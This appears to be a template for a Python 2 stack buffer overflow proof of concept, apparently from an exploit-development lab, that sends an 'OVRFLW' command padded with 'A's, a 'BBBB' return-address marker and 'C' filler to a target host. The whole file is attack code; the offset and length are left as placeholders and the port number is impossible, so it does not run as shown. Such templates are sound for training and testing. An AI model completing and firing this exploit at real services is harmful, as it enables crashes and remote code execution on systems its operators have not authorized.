#!/usr/bin/python

import sys, socket

if len(sys.argv) < 2:
    print "\nUsage: " + sys.argv[0] + " <HOST>\n"
    sys.exit()

cmd = "OVRFLW "
junk = "\x41" * zzzzzzzzzz + "\x42" * 4 + "\x43"  * (vvvvvvvvvv-zzzzzzzzzz-4)
end = "\r\n"

buffer = cmd + junk + end

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((sys.argv[1], 9999999999))
s.send(buffer)
s.recv(1024)
s.close()
